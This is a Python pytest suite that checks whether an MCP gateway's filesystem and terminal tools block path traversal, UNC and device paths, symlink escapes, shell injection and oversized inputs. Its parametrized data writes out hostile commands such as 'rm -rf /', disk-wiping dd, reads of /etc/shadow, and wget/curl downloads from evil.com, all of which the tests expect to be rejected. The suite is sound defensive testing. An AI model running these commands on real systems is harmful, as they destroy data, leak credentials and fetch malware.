"""
安全边界专项测试：验证路径沙箱、命令注入、边界极值防护是否有效。

覆盖：
  - 路径穿越类：多级 ../、Windows 8.3 短文件名、UNC 路径、符号链接绕过、大小写变形
  - 命令注入类：& | && ; 拼接、参数注入、shell 转义绕过
  - 边界极值类：超长路径、超大参数、非法特殊字符
"""

import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.exceptions import PermissionDeniedError, ToolExecutionError
from mcp_gateway.tools.filesystem import FilesystemToolProvider
from mcp_gateway.tools.terminal import TerminalToolProvider

# ============================================================
# Fixtures
# ============================================================

@pytest.fixture
def fs_provider():
    return FilesystemToolProvider()


@pytest.fixture
def term_provider():
    return TerminalToolProvider()


# ============================================================
# 1. 路径穿越类 — Path Traversal
# ============================================================

class TestPathTraversal:
    """路径穿越攻击：../ 多层嵌套、相对路径绕过。"""

    @pytest.mark.parametrize("traversal_path", [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config",
        "subdir/../../../etc/shadow",
        "subdir\\..\\..\\..\\windows\\win.ini",
        "a/../../../b/../../../etc/hosts",
        "a\\..\\..\\..\\b\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    ])
    @pytest.mark.asyncio
    async def test_basic_path_traversal(self, fs_provider, traversal_path):
        """多级 ../ 路径穿越应被拦截。"""
        with pytest.raises(PermissionDeniedError, match="traversal|outside safe"):
            await fs_provider.call_tool("read_file", {"path": traversal_path})

    @pytest.mark.parametrize("encoded_path", [
        "%2e%2e%2f%2e%2e%2fetc/passwd",
        "%2e%2e\\%2e%2e\\windows\\win.ini",
    ])
    @pytest.mark.asyncio
    async def test_url_encoded_traversal(self, fs_provider, encoded_path):
        """URL 编码的路径穿越应被拦截。"""
        with pytest.raises((PermissionDeniedError, ToolExecutionError)):
            await fs_provider.call_tool("read_file", {"path": encoded_path})

    @pytest.mark.asyncio
    async def test_nested_traversal_deep(self, fs_provider):
        """深层嵌套的 ../ 组合应被拦截。"""
        deep = "../" * 20 + "etc/passwd"
        with pytest.raises(PermissionDeniedError, match="traversal|outside safe"):
            await fs_provider.call_tool("read_file", {"path": deep})

    @pytest.mark.asyncio
    async def test_mixed_separator_traversal(self, fs_provider):
        """混合 / 和 \\ 分隔符的路径穿越。"""
        mixed = "..\\..\\../etc/../windows/system32/config"
        with pytest.raises(PermissionDeniedError):
            await fs_provider.call_tool("read_file", {"path": mixed})

    @pytest.mark.asyncio
    async def test_dot_dot_inside_filename(self, fs_provider):
        """确保 C:\\Users\\admin 不会错误匹配 C:\\Users\\admin_hacker。"""
        # 这种路径不应被识别为穿越，而是应该去读白名单外的文件
        with pytest.raises(PermissionDeniedError):
            await fs_provider.call_tool("read_file", {"path": "/tmp/admin_hacker/secret.txt"})


class TestWindowsPathBypass:
    """Windows 特有路径绕过手段。"""

    @pytest.mark.skipif(os.name != "nt", reason="Windows-specific: case-insensitive path test")
    @pytest.mark.asyncio
    async def test_case_variation(self, fs_provider):
        """大小写变形绕过（Windows 路径大小写不敏感）。"""
        # 如果白名单包含 C:\Users，c:\users 也应被允许
        path_variants = [
            os.path.expanduser("~").upper() + "\\test.txt",
            os.path.expanduser("~").lower() + "\\test.txt",
        ]
        for p in path_variants:
            # 可能文件不存在（FileNotFound），但不应是 PermissionDenied
            try:
                await fs_provider.call_tool("read_file", {"path": p})
            except PermissionDeniedError:
                pytest.fail(f"Case variation should not be blocked: {p}")
            except ToolExecutionError as e:
                if "not found" in str(e).lower():
                    pass  # File not found is OK
                elif "traversal" in str(e).lower():
                    pytest.fail(f"Case variation should not trigger traversal block: {p}")

    @pytest.mark.asyncio
    async def test_unc_path_blocked(self, fs_provider):
        """UNC 路径应被拦截。"""
        unc_paths = [
            "\\\\localhost\\C$\\Windows\\System32\\config",
            "\\\\192.168.1.1\\share\\secret.txt",
            "//server/share/file.txt",
        ]
        for p in unc_paths:
            with pytest.raises(PermissionDeniedError, match="UNC"):
                await fs_provider.call_tool("read_file", {"path": p})

    @pytest.mark.asyncio
    async def test_device_paths_blocked(self, fs_provider):
        """Windows 设备名路径应被拦截。"""
        device_paths = [
            "CON",
            "NUL",
            "COM1",
            "LPT1",
            "AUX",
            "PRN",
            "CON.txt",
            "NUL.txt",
            "\\\\.\\COM1",
            "\\\\.\\PhysicalDrive0",
        ]
        for p in device_paths:
            with pytest.raises((PermissionDeniedError, ToolExecutionError)):
                await fs_provider.call_tool("read_file", {"path": p})

    @pytest.mark.asyncio
    async def test_symbolic_link_bypass(self, fs_provider, tmp_path):
        """符号链接跳转到白名单外应被拦截。"""
        if os.name != "nt":
            # 创建符号链接需要一定权限
            try:
                outside = tmp_path / "outside_secret.txt"
                outside.write_text("secret data")
                link = tmp_path / "innocent_link"
                os.symlink(str(outside), str(link))
                with pytest.raises(PermissionDeniedError):
                    await fs_provider.call_tool("read_file", {"path": str(link)})
            except (OSError, PermissionError):
                pytest.skip("No symlink permission")
        else:
            pytest.skip("Symlink test skipped on Windows (requires admin)")


# ============================================================
# 2. 命令注入类 — Command Injection
# ============================================================

class TestCommandInjection:
    """命令注入攻击防护验证。"""

    @pytest.mark.parametrize("injected_cmd", [
        "ls; rm -rf /",
        "ls | shutdown /s /t 0",
        "cat file && format C:",
        "dir || del /F /S C:\\*",
        "ls & taskkill /F /IM explorer.exe",
        "echo `cat /etc/shadow`",
        "echo $(cat /etc/passwd)",
        "ping -n 1 127.0.0.1 > /dev/null",
        "ls 2>&1",
    ])
    @pytest.mark.asyncio
    async def test_shell_injection_blocked(self, term_provider, injected_cmd):
        """Shell 连接符/重定向/命令替换应被拦截。"""
        with pytest.raises(ToolExecutionError, match="已禁用|blocked|syntax"):
            await term_provider.call_tool("run_command", {"command": injected_cmd})

    @pytest.mark.asyncio
    async def test_subprocess_exec_not_shell(self, term_provider, tmp_path):
        """参数中有 & 等字符但无 shell 连接符语义时允许执行"""
        # 创建临时脚本包含 & 字符，确认不会触发 shell 连接符检测
        script = tmp_path / "print_ampersand.py"
        script.write_text("import sys; sys.stdout.write('a&b')")
        result = await term_provider.call_tool(
            "run_command",
            {"command": f'python -B {script}'}
        )
        assert not result.is_error
        assert "a&b" in result.content[0]["text"]

    @pytest.mark.parametrize("dangerous_cmd", [
        "rm -rf /",
        "mkfs.ext4 /dev/sda1",
        "dd if=/dev/zero of=/dev/sda",
        "shutdown /s /t 0",
        "reboot",
        "systemctl poweroff",
        "wget http://evil.com/malware.exe",
        "curl -o /tmp/evil.sh http://evil.com/script.sh",
    ])
    @pytest.mark.asyncio
    async def test_blocked_commands(self, term_provider, dangerous_cmd):
        """黑名单命令应被拦截。"""
        with pytest.raises(ToolExecutionError, match="blocked|已禁用"):
            await term_provider.call_tool("run_command", {"command": dangerous_cmd})

    @pytest.mark.parametrize("interactive_cmd", [
        "vim /etc/passwd",
        "nano /etc/config",
        "top",
        "htop",
        "tail -f /var/log/syslog",
    ])
    @pytest.mark.asyncio
    async def test_interactive_commands_blocked(self, term_provider, interactive_cmd):
        """交互式命令应被拦截。"""
        with pytest.raises(ToolExecutionError, match="not supported"):
            await term_provider.call_tool("run_command", {"command": interactive_cmd})

    @pytest.mark.asyncio
    async def test_whitelist_outside_blocked(self, term_provider, monkeypatch):
        """白名单模式：不在白名单的命令应被拦截。"""
        monkeypatch.setenv("MCP_TERMINAL_USE_WHITELIST", "true")
        # 重新导入以触发 env 读取
        import importlib

        import mcp_gateway.tools.terminal as term_mod
        importlib.reload(term_mod)
        new_provider = term_mod.TerminalToolProvider()
        with pytest.raises(ToolExecutionError, match="whitelist|不在白名单"):
            await new_provider.call_tool("run_command", {"command": "unsafe_tool --danger"})

    @pytest.mark.asyncio
    async def test_oversized_command_blocked(self, term_provider):
        """超长命令应被拦截。"""
        long_cmd = "echo " + "x" * 600
        with pytest.raises(ToolExecutionError, match="too long|Command too long"):
            await term_provider.call_tool("run_command", {"command": long_cmd})

    @pytest.mark.asyncio
    async def test_empty_command_blocked(self, term_provider):
        """空命令应被拦截。"""
        with pytest.raises(ToolExecutionError):
            await term_provider.call_tool("run_command", {"command": ""})

    @pytest.mark.asyncio
    async def test_invalid_syntax_blocked(self, term_provider):
        """无效的命令语法应被拦截。"""
        with pytest.raises(ToolExecutionError):
            await term_provider.call_tool("run_command", {"command": "'unclosed_quote"})


# ============================================================
# 3. 边界极值类 — Edge Cases
# ============================================================

class TestEdgeCases:
    """边界极值测试：超长参数、非法字符等。"""

    @pytest.mark.asyncio
    async def test_very_long_path(self, fs_provider):
        """超长路径应优雅拒绝。"""
        long_path = "/" + "a" * 5000 + "/file.txt"
        with pytest.raises((PermissionDeniedError, ToolExecutionError)):
            await fs_provider.call_tool("read_file", {"path": long_path})

    @pytest.mark.parametrize("weird_path", [
        "/dev/null",
        "/dev/random",
        "/proc/self/environ",
        "/sys/class/power_supply",
        "/etc/shadow",
    ])
    @pytest.mark.asyncio
    async def test_sensitive_system_paths_blocked(self, fs_provider, weird_path):
        """敏感系统路径应被拦截（不在白名单内）。"""
        with pytest.raises(PermissionDeniedError):
            await fs_provider.call_tool("read_file", {"path": weird_path})

    @pytest.mark.asyncio
    async def test_null_byte_injection(self, fs_provider):
        """空字节注入应被处理（不崩溃）。"""
        with pytest.raises((PermissionDeniedError, ToolExecutionError, Exception)):
            await fs_provider.call_tool("read_file", {"path": "../../etc/passwd%00.txt"})

    @pytest.mark.parametrize("bad_arg", [
        None,
        12345,
        ["a", "b"],
        {"nested": "dict"},
    ])
    @pytest.mark.asyncio
    async def test_non_string_path_args(self, fs_provider, bad_arg):
        """非字符串路径参数应优雅处理。"""
        with pytest.raises((PermissionDeniedError, ToolExecutionError, TypeError, KeyError)):
            await fs_provider.call_tool("read_file", {"path": bad_arg})

    @pytest.mark.asyncio
    async def test_missing_required_arg(self, fs_provider):
        """缺少必填参数应抛出异常而非静默失败。"""
        with pytest.raises((ToolExecutionError, KeyError, TypeError)):
            await fs_provider.call_tool("read_file", {})

    @pytest.mark.asyncio
    async def test_unicode_path_bypass(self, fs_provider):
        """Unicode 字符路径穿越尝试。"""
        unicode_traversal = "..\\..\\..\\..\\etc\\passwd"
        with pytest.raises(PermissionDeniedError):
            await fs_provider.call_tool("read_file", {"path": unicode_traversal})

    @pytest.mark.asyncio
    async def test_very_long_command(self, term_provider):
        """超长命令参数限制。"""
        very_long = "echo " + "A" * 10000
        with pytest.raises(ToolExecutionError, match="too long|Command too long"):
            await term_provider.call_tool("run_command", {"command": very_long})

    @pytest.mark.asyncio
    async def test_working_dir_outside_workspace(self, term_provider):
        """工作目录超出 workspace 应被拦截。"""
        with pytest.raises(ToolExecutionError, match="outside workspace"):
            await term_provider.call_tool(
                "run_command",
                {"command": "echo hello", "cwd": os.environ.get("SYSTEMROOT", "C:\\Windows")}
            )
